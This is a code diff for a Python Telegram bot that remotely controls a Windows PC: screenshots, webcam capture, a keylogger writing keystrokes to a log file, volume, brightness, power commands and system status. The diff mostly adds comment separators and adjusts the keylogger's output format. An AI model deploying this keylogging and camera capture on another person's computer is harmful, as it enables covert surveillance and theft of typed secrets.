@@ -1,30 +1,40 @@
+################################################################################
 # system
 import os
 import time
 import ctypes
 import platform
+################################################################################
 # bot
 from telebot import types
 import telebot
+################################################################################
 # screenshot
 from mss import mss
+################################################################################
 # volume
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+################################################################################
 # brightness
 import screen_brightness_control as sbc
+################################################################################
 # mouse
 import mouse
+################################################################################
 # battery status
 import psutil
+################################################################################
 # ip
 import socket
+################################################################################
 # keylogger
 # ! pip install pynput
 import pynput
 from pynput.keyboard import Key, Listener
 # modules
+################################################################################
 from inputData import getData, Data
 
 
@@ -93,13 +103,14 @@ print('🚀 Bot launched')
 
 
 
+################################################################################ start
 @bot.message_handler(commands = ['start'])
 def Start(message):
     bot.send_message(message.chat.id, '🚀  Bot launched')
     bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')
 
 
-
+################################################################################ help
 @bot.message_handler(commands = ['help'])
 def Help(message):
     bot.send_message(message.chat.id, '''
@@ -125,7 +136,7 @@ def Help(message):
     ''', parse_mode = 'Markdown')
 
 
-
+################################################################################ screenshot
 @bot.message_handler(commands = ['screenshot', 'screen'])
 def Screenshot(message):
     if message.chat.id != user.ID:
@@ -140,7 +151,7 @@ def Screenshot(message):
     os.remove('Screenshot.png')
 
 
-
+################################################################################ webcam
 @bot.message_handler(commands = ['webcam', 'cam'])
 def Webcam(message):
     if message.chat.id != user.ID:
@@ -154,8 +165,7 @@ def Webcam(message):
     os.remove('Webcam.png')
 
 
-
-# TODO keylogger
+################################################################################ keylogger
 @bot.message_handler(commands = ['keylogger', 'key', 'log'])
 def Keylogger(message):
     if message.chat.id != user.ID:
@@ -188,8 +198,11 @@ def writeFile(keys):
     with open('Logs.txt', 'a') as f:
         for key in keys:
             k = str(key).replace('\'', '')
-            if k.find('space') > 0:
-                f.write('\n')
+            print(key)
+            # if k.find('space') > 0:
+            #     f.write('\n')
+            if k.find('enter') > 0:
+                f.write('[ENTER]\n')
             elif k.find('Key.') != -1:
                 k = k.replace('Key.', '[') + ']'
                 f.write(k.upper())
@@ -197,6 +210,7 @@ def writeFile(keys):
                 f.write(k)
 
 
+################################################################################ volume
 @bot.message_handler(commands = ['volume', 'vol'])
 def Volume(message):
     if message.chat.id != user.ID:
@@ -230,7 +244,7 @@ def getVolumeEmoji(volume):
         return '🔊'
 
 
-
+################################################################################ brightness
 @bot.message_handler(commands = ['brightness', 'bright'])
 def Brightness(message):
     if message.chat.id != user.ID:
@@ -261,7 +275,7 @@ def getBrightnessEmoji(brightness):
         return '☀️'
 
 
-
+################################################################################ lock
 @bot.message_handler(commands = ['lock'])
 def Lock(message):
     if message.chat.id != user.ID:
@@ -272,7 +286,7 @@ def Lock(message):
     bot.send_message(message.chat.id, '*Locked 🔒*', parse_mode = 'Markdown')
 
 
-
+################################################################################ shutdown
 @bot.message_handler(commands = ['shutdown', 'sd'])
 def Shutdown(message):
     if message.chat.id != user.ID:
@@ -292,7 +306,7 @@ def Shutdown_process(message):
     os.system(f'shutdown -s -t {seconds}')
 
 
-
+################################################################################ reboot
 @bot.message_handler(commands = ['reboot', 'rb'])
 def Reeboot(message):
     if message.chat.id != user.ID:
@@ -312,7 +326,7 @@ def Reboot_process(message):
     os.system(f'shutdown -r -t {seconds}')
 
 
-
+################################################################################ sleep
 @bot.message_handler(commands = ['sleep'])
 def Sleep(message):
     if message.chat.id != user.ID:
@@ -341,7 +355,7 @@ def Sleep_process(message):
     os.system('shutdown /h')
 
 
-
+################################################################################ battery
 @bot.message_handler(commands = ['battery'])
 def Battery(message):
     if message.chat.id != user.ID:
@@ -367,7 +381,7 @@ def chargingEmoji(status):
         return '🔌'
 
 
-
+################################################################################ ip
 @bot.message_handler(commands = ['ip'])
 def SendIP(message):
     if message.chat.id != user.ID:
@@ -378,13 +392,13 @@ def getIP():
     return socket.gethostbyname(socket.gethostname())
 
 
-
+################################################################################ get id
 @bot.message_handler(commands = ['getId', 'id'])
 def getID(message):
     bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')
 
 
-
+################################################################################ info
 @bot.message_handler(commands = ['info', 'pc', 'pc_info'])
 def PcInfo(message):
     if message.chat.id != user.ID:
@@ -405,7 +419,7 @@ def PcInfo(message):
     bot.send_message(message.chat.id, msg, parse_mode = "markdown")
 
 
-
+################################################################################ status
 @bot.message_handler(commands = ['status', 'pc_status'])
 def PcStatus(message):
     if message.chat.id != user.ID:
@@ -434,7 +448,7 @@ def getSize(bytes, suffix="B"):
         bytes /= factor
 
 
-
+################################################################################ stop
 @bot.message_handler(commands = ['stop'])
 def stopBot(message):
     if message.chat.id != user.ID:
@@ -446,7 +460,7 @@ def stopBot(message):
 
 
 
-#################/              -| callback handler |-             /#############################
+################################################################################ / callback handler
 @bot.callback_query_handler(func = lambda call: True)
 def TurnOffCallback(call):
     if call.data == 'cancelShutdown':
@@ -472,7 +486,7 @@ def TurnOffCallback(call):
         os.remove('Logs.txt')
 
 
-
+################################################################################ warn
 def Warn(message):
     bot.send_chat_action(message.chat.id, 'typing')
     bot.send_chat_action(user.ID, 'typing')
@@ -490,5 +504,5 @@ def Warn(message):
     bot.send_message(user.ID, f'{msg}', parse_mode = 'Markdown')
 
 
-
+################################################################################ infinite polling
 bot.polling(none_stop = True)
